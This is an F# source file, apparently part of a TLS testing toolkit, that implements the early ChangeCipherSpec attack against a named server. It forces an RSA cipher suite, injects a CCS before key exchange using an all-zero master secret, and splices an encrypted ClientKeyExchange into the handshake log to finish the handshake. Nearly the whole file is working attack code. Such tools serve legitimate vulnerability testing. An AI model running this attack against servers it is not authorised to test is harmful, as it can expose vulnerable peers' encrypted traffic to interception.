#light "off"

module Attack_EarlyCCS

open Bytes
open TLSInfo
open TLSConstants

open FlexTypes
open FlexConstants
open FlexConnection
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets




type Attack_EarlyCCS =
    class

    static member run (server_name:string, ?port:int) : unit =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start TCP connection with the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Ensure we use RSA
        let fch = {FlexConstants.nullFClientHello with
            suites = [TLS_RSA_WITH_AES_128_CBC_SHA] } in

        let st,nsc,fch   = FlexClientHello.send(st,fch) in
        let st,nsc,fsh   = FlexServerHello.receive(st,nsc) in
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in

        // Inject early CCS and start encrypting early
        let st,_         = FlexCCS.send(st) in

        // We fill the master secret with zeros because it has no data from the KEX yet
        // Then we compute and install the writing keys
        let epk          = { nsc.keys with ms = (Bytes.createBytes 48 0)} in
        let nsc          = { nsc with keys = epk} in
        let nsc          = FlexSecrets.fillSecrets(st,Client,nsc) in
        let st           = FlexState.installWriteKeys st nsc in

        // If this step go through, the peer is suceptible to the attack
        // It should throw a "Unexpected message" fatal alert because of the early CCS

        // We compute the encrypted payload including the fragment header of the ClientKeyExchange but don't send it
        let fckep,_,_,_  = FlexClientKeyExchange.prepareRSA(st,nsc,fch) in
        let _,fckeencpwh = FlexRecord.encrypt(st.write.epoch,fsh.pv,st.write.record,Handshake,fckep) in
        let _,fckeencp   = Bytes.split fckeencpwh 6 in


        // We continue the usual handshake procedure
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
        
        // Here instead of the usual plain ClientKeyExchange payload, we concatenate the encrypted one in the log
        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload @| fckeencpwh in
        let st,ffC       = FlexFinished.send(st,logRoleNSC=(log,Client,nsc)) in
        let st,_         = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
        let st,ffS       = FlexFinished.receive(st,verify_data) in
        ()

    end





